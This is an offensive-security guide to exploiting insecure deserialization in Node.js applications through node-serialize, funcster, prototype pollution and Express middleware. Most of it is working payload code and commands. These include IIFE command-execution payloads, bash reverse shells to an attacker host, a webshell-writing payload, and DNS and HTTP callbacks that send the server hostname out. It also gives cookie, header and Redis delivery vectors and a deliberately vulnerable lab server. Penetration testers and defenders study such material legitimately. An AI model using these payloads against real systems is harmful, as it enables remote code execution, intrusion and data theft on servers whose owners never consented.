# Node.js Deserialization Guide

> Practical methodology for exploiting Node.js insecure deserialization vulnerabilities, covering node-serialize, funcster, prototype pollution chains, and Express middleware attacks with real-world exploitation techniques.

## Introduction and Objectives

Node.js deserialization vulnerabilities arise when applications deserialize untrusted data using libraries that support function serialization or when prototype pollution enables gadget chain construction. While Node.js does not have a native binary serialization format as dangerous as Java's, several popular npm packages introduce deserialization attack surfaces that can lead directly to remote code execution.

This guide covers:

- Understanding node-serialize and funcster function serialization exploitation
- IIFE (Immediately Invoked Function Expression) injection techniques
- Prototype pollution as a deserialization primitive
- Express middleware deserialization attack surfaces
- Blind deserialization detection in Node.js environments
- Full exploitation walkthroughs with payload construction

### Prerequisites

- Node.js runtime (v14+) installed for payload generation
- npm packages: node-serialize, funcster (for testing)
- Burp Suite or similar proxy for request manipulation
- Callback infrastructure for blind detection
- Basic understanding of JavaScript prototypes and closures

## 1. Node.js Serialization Format Fundamentals

### Understanding Function Serialization

Unlike Java or PHP, Node.js does not have a built-in object serialization format that supports arbitrary class instantiation. However, npm packages like `node-serialize` and `funcster` add the ability to serialize and deserialize JavaScript functions, creating a direct path to code execution.

```bash
# node-serialize uses _$$ND_FUNC$$_ marker for serialized functions
node -e '
var serialize = require("node-serialize");

// Normal serialization
var obj = { name: "admin", role: "superuser" };
console.log("Serialized:", serialize.serialize(obj));

// Function serialization (when enabled)
var objWithFunc = {
  name: "admin",
  greet: function() { return "Hello " + this.name; }
};
console.log("With function:", serialize.serialize(objWithFunc));
// Output includes: _$$ND_FUNC$$_function(){return "Hello "+this.name}
'

# Identify node-serialize in HTTP traffic
# Look for _$$ND_FUNC$$_ markers in Base64-decoded cookie/parameter values
# Common in session cookies, API payloads, and cached objects

# funcster uses __function__ marker
node -e '
var funcster = require("funcster");

var obj = {
  action: function() { return "executed"; }
};
console.log("Funcster serialized:", JSON.stringify(funcster.serialize(obj)));
// Output includes: {"action":{"__function__":{"__name__":"action","__body__":"return \"executed\""}}}
'
```

### Magic Marker Identification

```bash
# node-serialize markers
# _$$ND_FUNC$$_ - function marker in serialized output
# The function body is stored as plain JavaScript

# funcster markers
# __function__ - wraps serialized function with __name__ and __body__

# Detection in HTTP traffic
# 1. Decode Base64 cookies/parameters
# 2. Search for _$$ND_FUNC$$_ or __function__ strings
# 3. If found, the application uses function serialization

# Quick check for node-serialize in dependencies
curl -s http://target/package.json | grep -i "node-serialize\|funcster\|serialize"
curl -s http://target/package-lock.json | grep -i "node-serialize"

# Check for serialization in JavaScript bundles
curl -s http://target/app.js | grep -i "serialize.unserialize\|serialize.deserialize\|funcster"
```

## 2. node-serialize Exploitation

### IIFE Injection Fundamentals

The `node-serialize` library allows function serialization but does not automatically invoke deserialized functions. However, by appending `()` to the function body, attackers can create an IIFE (Immediately Invoked Function Expression) that executes on deserialization.

```bash
# Understanding the vulnerability
# Normal serialized function (NOT executed on deserialize):
# {"greet":"_$$ND_FUNC$$_function(){return 'hello'}"}

# IIFE payload (EXECUTED on deserialize due to trailing ()):
# {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

# Basic command execution payload
node -e '
var payload = JSON.stringify({
  rce: "_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\")}()"
});
console.log(payload);
// Output: {"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\")}()"}
'

# The trailing () is critical -- it turns the function into an IIFE
# Without () the function is defined but never called
# With () it executes immediately during deserialization
```

### Command Execution Payloads

```bash
# Simple ID execution
node -e '
var payload = "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"id\\\")}()\"}";
console.log(payload);
'

# Reverse shell payload
node -e '
var payload = "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"bash -c \\\\\\\"bash -i >& /dev/tcp/attacker/4444 0>&1\\\\\\\"\\\")}()\"}";
console.log(payload);
'

# File write for webshell deployment
node -e '
var payload = "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"fs\\\").writeFileSync(\\\"/var/www/html/shell.js\\\",\\\"require(\\\\\\\"child_process\\\\\\\").execSync(require(\\\\\\\"url\\\\\\\").parse(require(\\\\\\\"process\\\\\\\").env.HTTP_QUERY,true).query.c)\\\")}()\"}";
console.log(payload);
'

# DNS callback for blind detection
node -e '
var payload = "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"dns\\\").resolve(\\\"nodejs.attacker.com\\\",function(){})}()\"}";
console.log(payload);
'

# HTTP callback for blind detection
node -e '
var payload = "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"http\\\").get(\\\"http://attacker/nodejs-callback\\\")}()\"}";
console.log(payload);
'
```

### Payload Delivery Vectors

```bash
# Vector 1: Cookie-based deserialization
# Generate Base64-encoded payload for cookie injection
node -e '
var payload = JSON.stringify({
  user: "admin",
  rce: "_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"
});
console.log(Buffer.from(payload).toString("base64"));
'
# Inject: Cookie: session=BASE64_PAYLOAD

# Vector 2: POST parameter injection
node -e '
var payload = JSON.stringify({
  preferences: {
    theme: "dark",
    rce: "_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"whoami\")}()"
  }
});
console.log(payload);
'
# Inject into POST body as serialized data parameter

# Vector 3: API endpoint accepting serialized objects
curl -X POST http://target/api/data \
  -H 'Content-Type: application/json' \
  -d '{"data":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}'

# Vector 4: Redis/Memcached session store
# If sessions are stored in Redis with node-serialize serialization
# Inject payload directly into Redis key
redis-cli SET "sess:SESSION_ID" "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"id\\\")}()\"}"
```

## 3. funcster Exploitation

### funcster Deserialization Attacks

The `funcster` library uses a different serialization format that wraps functions in a `__function__` object with `__name__` and `__body__` properties.

```bash
# Basic funcster RCE payload
node -e '
var payload = JSON.stringify({
  action: {
    "__function__": {
      "__name__": "execute",
      "__body__": "require(\"child_process\").execSync(\"id\").toString()"
    }
  }
});
console.log(payload);
'
// Output: {"action":{"__function__":{"__name__":"execute","__body__":"require("child_process").execSync("id").toString()"}}}

# Reverse shell via funcster
node -e '
var payload = JSON.stringify({
  handler: {
    "__function__": {
      "__name__": "shell",
      "__body__": "require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/attacker/4444 0>&1\\\"\")"
    }
  }
});
console.log(payload);
'

# DNS callback via funcster
node -e '
var payload = JSON.stringify({
  resolver: {
    "__function__": {
      "__name__": "dns",
      "__body__": "require(\"dns\").resolve(\"funcster.attacker.com\",function(){})"
    }
  }
});
console.log(payload);
'

# File system operations via funcster
node -e '
var payload = JSON.stringify({
  writer: {
    "__function__": {
      "__name__": "write",
      "__body__": "require(\"fs\").writeFileSync(\"/tmp/funcster-pwned\", \"rce confirmed\")"
    }
  }
});
console.log(payload);
'
```

### funcster in Express Middleware

```bash
# funcster may be used in Express middleware for session deserialization
# Check for funcster in middleware stack
node -e '
// Vulnerable middleware pattern:
// app.use(function(req, res, next) {
//   if (req.cookies.session) {
//     var data = Buffer.from(req.cookies.session, "base64").toString();
//     req.session = funcster.deserialize(JSON.parse(data));
//   }
//   next();
// });
console.log("Identify funcster.deserialize() in middleware");
'

# Generate payload for session cookie
node -e '
var payload = JSON.stringify({
  user: {
    "__function__": {
      "__name__": "rce",
      "__body__": "require(\"child_process\").execSync(\"id\")"
    }
  }
});
var encoded = Buffer.from(payload).toString("base64");
console.log("Cookie value:", encoded);
'
```

## 4. Prototype Pollution Chains

### Understanding Prototype Pollution

JavaScript uses prototype-based inheritance. Every object has a prototype chain that links to `Object.prototype`. Prototype pollution occurs when an attacker can modify `Object.prototype`, affecting all objects in the application. This can be used to create deserialization gadgets or bypass security checks.

```bash
# Basic prototype pollution via deep merge
node -e '
var merge = require("deepmerge");

// Safe merge (deepmerge v4+ has protections)
// Older merge functions are vulnerable:
function vulnerableMerge(target, source) {
  for (var key in source) {
    if (source[key] && typeof source[key] === "object") {
      if (!target[key]) target[key] = {};
      vulnerableMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

var payload = JSON.parse("{\"__proto__\":{\"isAdmin\":true}}");
var result = vulnerableMerge({}, payload);
console.log("Polluted:", {}.isAdmin); // true
'

# Common vulnerable npm packages (historical)
# - deepmerge (versions before protections)
# - lodash.merge, lodash.mergeWith (CVE-2020-8203)
# - object-path (CVE-2020-36152)
# - hoek (CVE-2018-3722)
# - utils-merge (CVE-2017-16114)
```

### Prototype Pollution to RCE

```bash
# Pollution to create gadget for node-serialize exploitation
# If Object.prototype.shell is set, all objects inherit it
node -e '
var payload = JSON.stringify({
  "__proto__": {
    "shell": "require(\"child_process\").execSync(\"id\")"
  }
});
console.log(payload);
'

# Pollution via JSON.parse (affects __proto__ in some versions)
node -e '
// When a deep merge or clone does not filter __proto__:
var malicious = JSON.parse("{\"__proto__\":{\"polluted\":\"yes\"}}");
// If merged without filtering, Object.prototype.polluted = "yes"
console.log("Pollution payload:", JSON.stringify(malicious));
'

# Prototype pollution to bypass authorization
node -e '
// If application checks: if (user.isAdmin)
// And user object does not have isAdmin property
// Prototype pollution can set Object.prototype.isAdmin = true
var payload = JSON.stringify({
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
});
console.log(payload);
'
```

### Prototype Pollution via Deserialization

```bash
# If application deserializes user-controlled JSON without __proto__ filtering
node -e '
// Vulnerable pattern:
// var data = JSON.parse(userInput);
// Object.assign(config, data);  // Does NOT copy __proto__
// But custom merge functions might

// Safe: JSON.parse does NOT set __proto__ via property assignment
// Unsafe: deep merge/clone that iterates __proto__ key
var payload = JSON.stringify({
  "constructor": {
    "prototype": {
      "isAdmin": true,
      "role": "superadmin"
    }
  }
});
console.log("constructor.prototype pollution payload:", payload);
'

# Prototype pollution via lodash
node -e '
// CVE-2020-8203: lodash.zipObjectDeep
// CVE-2020-28500: lodash template injection
// CVE-2021-23337: lodash template command injection

var payload = JSON.stringify({
  "__proto__": {
    "lodashPolluted": "true"
  }
});
console.log(payload);
'
```

## 5. Express Middleware Attacks

### Session Deserialization

Express applications commonly use express-session with various session stores. Some configurations use unsafe serialization.

```bash
# Identify Express session middleware
curl -sI http://target/ | grep -i "set-cookie"
# Look for: connect.sid, express.sid, session

# Express session cookie analysis
# Format: s:<payload>.<signature> (if using cookie-signature)
# Payload may be URL-safe Base64 encoded JSON or serialized object

# Check for node-serialize in session handling
# Vulnerable pattern:
# var session = serialize.unserialize(cookieValue);

# Test for node-serialize session deserialization
node -e '
var serialize = require("node-serialize");
var payload = serialize.serialize({
  user: "admin",
  rce: "_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"
});
console.log("Session payload:", payload);
console.log("Base64:", Buffer.from(payload).toString("base64"));
'
```

### Body Parser Deserialization

```bash
# Express body-parser with reviver option
# JSON.parse can use a reviver function that may enable exploitation
node -e '
// If body-parser uses a custom reviver that deserializes functions:
// app.use(express.json({ reviver: customReviver }));
// And customReviver instantiates objects from type hints

// Safe detection payload
var payload = JSON.stringify({
  "__proto__": {
    "debug": true
  }
});
console.log("Body parser pollution test:", payload);
'

# Express query string parsing
# qs library (used by body-parser) can create nested objects
node -e '
// qs.parse("a[b]=1&a[__proto__][polluted]=yes")
// May create: { a: { b: "1", __proto__: { polluted: "yes" } } }
var qs = require("qs");
var result = qs.parse("a[__proto__][polluted]=yes");
console.log("QS parse result:", JSON.stringify(result));
'
```

### Custom Middleware Exploitation

```bash
# Pattern: Custom middleware that deserializes cookies or headers
# app.use(function(req, res, next) {
#   var data = req.headers['x-serialized-data'];
#   if (data) {
#     req.customData = serialize.unserialize(Buffer.from(data, 'base64'));
#   }
#   next();
// });

# Exploit via custom header
PAYLOAD=$(node -e '
var serialize = require("node-serialize");
var payload = serialize.serialize({
  rce: "_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"
});
console.log(Buffer.from(payload).toString("base64"));
')

curl -s http://target/api \
  -H "X-Serialized-Data: ${PAYLOAD}" \
  -o /dev/null -w '%{http_code}\n'

# Exploit via custom cookie
curl -s http://target/api \
  -b "app_data=${PAYLOAD}" \
  -o /dev/null -w '%{http_code}\n'
```

## 6. Blind Deserialization Detection

### DNS-Based Detection

```bash
# node-serialize DNS callback
node -e '
var payload = JSON.stringify({
  probe: "_$$ND_FUNC$$_function(){require(\"dns\").resolve(\"nodejs.attacker.com\",function(){})}()"
});
console.log(Buffer.from(payload).toString("base64"));
'

# Alternative: Use dns.lookup for synchronous DNS resolution
node -e '
var payload = JSON.stringify({
  probe: "_$$ND_FUNC$$_function(){require(\"dns\").lookup(\"nodejs.attacker.com\",function(){})}()"
});
console.log(Buffer.from(payload).toString("base64"));
'

# Multi-stage DNS probe with unique identifiers
node -e '
var payload = JSON.stringify({
  probe: "_$$ND_FUNC$$_function(){require(\"dns\").resolve(require(\"os\").hostname()+\".nodejs.attacker.com\",function(){})}()"
});
console.log(Buffer.from(payload).toString("base64"));
'
```

### HTTP-Based Detection

```bash
# HTTP GET callback
node -e '
var payload = JSON.stringify({
  probe: "_$$ND_FUNC$$_function(){require(\"http\").get(\"http://attacker/nodejs-probe\",function(){})}()"
});
console.log(Buffer.from(payload).toString("base64"));
'

# HTTP callback with hostname exfiltration
node -e '
var payload = JSON.stringify({
  probe: "_$$ND_FUNC$$_function(){require(\"http\").get(\"http://attacker/\"+require(\"os\").hostname(),function(){})}()"
});
console.log(Buffer.from(payload).toString("base64"));
'

# HTTPS callback
node -e '
var payload = JSON.stringify({
  probe: "_$$ND_FUNC$$_function(){require(\"https\").get(\"https://attacker/nodejs-probe\",function(){})}()"
});
console.log(Buffer.from(payload).toString("base64"));
'
```

### Time-Based Detection

```bash
# 5-second delay via busy wait
node -e '
var payload = JSON.stringify({
  delay: "_$$ND_FUNC$$_function(){var start=Date.now();while(Date.now()-start<5000){}}()"
});
console.log(Buffer.from(payload).toString("base64"));
'

# 5-second delay via setTimeout (if async context available)
node -e '
var payload = JSON.stringify({
  delay: "_$$ND_FUNC$$_function(){var start=Date.now();while(Date.now()-start<5000){}}()"
});
console.log(payload);
'

# Measure response time with curl
time curl -s -o /dev/null -w '%{time_total}' \
  -b "session=BASE64_DELAY_PAYLOAD" \
  http://target/api
```

## Hands-on Exercises

### Exercise 1: node-serialize RCE

Build a vulnerable Express application for safe practice:

```bash
# Install dependencies
mkdir /tmp/node-deser-lab && cd /tmp/node-deser-lab
npm init -y
npm install express node-serialize cookie-parser

# Create vulnerable server
cat > server.js << 'JSEOF'
const express = require('express');
const cookieParser = require('cookie-parser');
const serialize = require('node-serialize');
const app = express();

app.use(cookieParser());

app.get('/', function(req, res) {
    if (req.cookies.session) {
        try {
            // VULNERABLE: unserializes user-controlled cookie data
            var session = serialize.unserialize(
                Buffer.from(req.cookies.session, 'base64').toString()
            );
            res.json({ user: session.user || 'unknown' });
        } catch(e) {
            res.status(500).send('Error: ' + e.message);
        }
    } else {
        res.send('<html><body><h1>Login</h1></body></html>');
    }
});

app.listen(3000, function() {
    console.log('Vulnerable server on port 3000');
});
JSEOF

# Start the server
node server.js &

# Test basic deserialization
PAYLOAD=$(node -e 'console.log(Buffer.from(JSON.stringify({user:"admin"})).toString("base64"))')
curl -s -b "session=${PAYLOAD}" http://localhost:3000/

# Test RCE payload
RCE_PAYLOAD=$(node -e '
var payload = JSON.stringify({
  user: "admin",
  rce: "_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"touch /tmp/node-rce-proof\")}()"
});
console.log(Buffer.from(payload).toString("base64"));
')
curl -s -b "session=${RCE_PAYLOAD}" http://localhost:3000/
ls -la /tmp/node-rce-proof

# Cleanup
kill %1
```

### Exercise 2: Prototype Pollution Detection

```bash
# Test for prototype pollution via HTTP parameters
node -e '
// Test payload for prototype pollution via query string
var payloads = [
  "__proto__[polluted]=yes",
  "constructor[prototype][polluted]=yes",
  "constructor.prototype.polluted=yes"
];
payloads.forEach(function(p) {
    console.log("Testing: " + p);
    console.log("curl -s \"http://target/api?" + p + "\"");
});
'

# Verify pollution by checking inherited properties
# If the server echoes back object properties, check for polluted values
curl -s "http://target/api?__proto__[polluted]=yes" | grep -i polluted
```

## References and Resources

- **node-serialize npm**: https://www.npmjs.com/package/node-serialize -- Package documentation (with security warnings)
- **CVE-2017-5941**: Original node-serialize deserialization CVE
- **funcster npm**: https://www.npmjs.com/package/funcster -- Function serialization library
- **Node.js Prototype Pollution**: https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/ -- Kibana prototype pollution to RCE research
- **Snyk Vulnerability DB**: https://snyk.io/vuln/?packageManager=npm -- Search for serialization-related npm vulnerabilities
- **OWASP Node.js Security**: https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html -- Node.js security best practices
- **PortSwigger Deserialization**: https://portswigger.net/web-security/deserialization -- General deserialization concepts applicable to Node.js
- **ExploitDB node-serialize**: https://www.exploit-db.com/exploits/49552 -- Exploit-DB entry for node-serialize RCE
- **Prototype Pollution Bible**: https://github.com/BlackFan/client-side-prototype-pollution -- Comprehensive prototype pollution research
- **Node.js Security Working Group**: https://github.com/nodejs/security-wg -- Node.js security advisories and best practices
